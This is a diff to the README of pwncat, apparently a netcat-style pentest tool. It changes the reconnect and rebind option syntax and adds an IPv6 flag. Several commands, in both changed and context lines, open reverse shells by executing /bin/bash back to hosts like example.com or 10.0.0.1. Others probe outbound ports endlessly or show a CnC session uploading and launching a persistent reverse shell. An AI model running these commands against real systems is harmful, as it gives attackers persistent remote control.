@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 94.07%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.94%)</strong></sup><br/>
 > <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
 
 
@@ -187,7 +187,7 @@ pwncat -l -e '/bin/bash' 8080 -k
 ```
 ```bash
 # Reverse shell (Ctrl+c proof: reconnects back to you)
-pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 1
+pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
 ```
 ```bash
 # Reverse UDP shell (Ctrl+c proof: reconnects back to you)
@@ -253,7 +253,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Self-injecting      | ✔      | :x:     | :x: |
 | IP ToS              | :x:    | ✔       | :x: |
 | IPv4                | ✔      | ✔       | ✔   |
-| IPv6                | *      | ✔       | ✔   |
+| IPv6                | ✔      | ✔       | ✔   |
 | Unix domain sockets | :x:    | ✔       | ✔   |
 | TCP                 | ✔      | ✔       | ✔   |
 | UDP                 | ✔      | ✔       | ✔   |
@@ -398,6 +398,7 @@ mode arguments:
                         target machine via the positional arguments.
 
 optional arguments:
+  -6                    Use IPv6 instead of IPv4.
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
   -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing
                         line endings for input and outout accordingly. Specify
@@ -476,10 +477,13 @@ advanced arguments:
                         disconnected or the connection is unterrupted otherwise.
                         (default: server will quit after connection is gone)
 
-  --rebind x            Listen mode (TCP and UDP):
+  --rebind [x]          Listen mode (TCP and UDP):
                         If the server is unable to bind, it will re-initialize
-                        itself x many times before giving up. Use -1 to re-init
-                        endlessly. (default: fail after first unsuccessful try).
+                        itself x many times before giving up. Omit the
+                        quantifier to rebind endlessly or specify a positive
+                        integer for how many times to rebind before giving up.
+                        See --rebind-robin for an interesting use-case.
+                        (default: fail after first unsuccessful try).
 
   --rebind-wait s       Listen mode (TCP and UDP):
                         Wait x seconds between re-initialization. (default: 1)
@@ -492,10 +496,12 @@ advanced arguments:
                         Set --rebind to at least the number of ports to probe +1
                         This option requires --rebind to be specified.
 
-  --reconn x            Connect mode / Zero-I/O mode (TCP only):
+  --reconn [x]          Connect mode / Zero-I/O mode (TCP only):
                         If the remote server is not reachable or the connection
                         is interrupted, the client will connect again x many
-                        times before giving up. Use -1 to retry endlessly.
+                        times before giving up. Omit the quantifier to retry
+                        endlessly or specify a positive integer for how many
+                        times to retry before giving up.
                         (default: quit if the remote is not available or the
                         connection was interrupted)
                         This might be handy for stable TCP reverse shells ;-)
@@ -634,10 +640,10 @@ In other words, the client will keep trying to connect to the specified server u
 # The client
 # --exec            # Provide this executable
 # --nodns           # Keep the noise down and don't resolve hostnames
-# --reconn          # Automatically reconnect back to you indefinitely
+# -reconn          # Automatically reconnect back to you indefinitely
 # --reconn-wait     # If connection is lost, connect back to you every 2 seconds
 
-pwncat --exec /bin/bash --nodns --reconn -1 --reconn-wait 2 10.0.0.1 4444
+pwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444
 ```
 
 ### Unbreakable UDP reverse shell
@@ -703,7 +709,7 @@ You will then see something like this:
 [PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT
 [PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)
 [PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us
-Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn -1 --reconn-wait 1 10.0.0.1 4445 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &
 ```
 And you are set. You can now start another listener locally at `4445` (again, it will connect back to you endlessly, so it is not required to start the listener first).
 ```bash
@@ -833,7 +839,7 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -l 4444           |      pwncat --reconn -1 \     |
+     pwncat -l 4444           |      pwncat --reconn \        |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
@@ -854,7 +860,7 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -u -l 53          |      pwncat -u --reconn -1 \  |
+     pwncat -u -l 53          |      pwncat -u --reconn \     |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
@@ -875,7 +881,7 @@ the client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.
 # --reconn-wait     # Reconnect every 0.1 seconds
 # --reconn-robin    # Use these ports to probe for outbount connections
 
-pwncat --exec /bin/bash --reconn -1 --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53
+pwncat --exec /bin/bash --reconn --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53
 ```
 
 Once the client is up and running, either use raw sockets to check for inbound traffic or use
